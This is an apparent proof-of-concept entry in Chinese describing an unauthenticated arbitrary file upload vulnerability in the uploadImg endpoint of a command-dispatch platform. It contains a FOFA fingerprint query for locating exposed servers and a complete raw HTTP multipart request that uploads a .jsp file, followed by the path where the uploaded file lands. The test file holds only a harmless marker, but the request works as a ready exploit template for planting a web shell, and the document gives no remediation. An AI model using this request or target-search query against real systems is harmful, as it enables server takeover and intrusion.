# 可视化融合指挥调度平台uploadImg存在任意文件上传漏洞

# 一、漏洞简介
可视化融合指挥调度平台以标准SIP协议为核心，提供强大的调度、广播、视频、报警、预案、电子地图等功能模块，可实现多级架构管理，满足不同行业调度需求。可视化融合指挥调度平台 uploadImg 接口处存在任意文件上传漏洞，未经身份验证的攻击者可利用此漏洞上传恶意后门文件，导致服务器权限被控。

# 二、影响版本
+ 可视化融合指挥调度平台

# 三、资产测绘
+ fofa`body="base/searchInfoWindow_min.css"`
+ 特征

![1712505801249-3dd9f411-b3c7-493b-af07-29fd9e07b090.png](./img/_XdfGiCW7VD3y65_/1712505801249-3dd9f411-b3c7-493b-af07-29fd9e07b090-227344.png)

# 四、漏洞复现
```plain
POST /dispatch/layuiIm/uploadImg HTTP/1.1
Host: 
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
Content-Length: 151

------WebKitFormBoundary7ctER307B0RaQwOp
Content-Disposition: form-data; name="file";filename="1.jsp"

1
------WebKitFormBoundary7ctER307B0RaQwOp--
```

![1713789052420-7e9a2d81-065b-4060-ac9e-7199dc69b680.png](./img/_XdfGiCW7VD3y65_/1713789052420-7e9a2d81-065b-4060-ac9e-7199dc69b680-543057.png)

```plain
/media/png/2024/4/22/1713787261034.jsp
```

![1713789069296-23477b7b-48af-4956-ab92-aa404dc58516.png](./img/_XdfGiCW7VD3y65_/1713789069296-23477b7b-48af-4956-ab92-aa404dc58516-570969.png)



> 更新: 2024-04-22 20:32:03  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bya2i7xgu6phi6t0>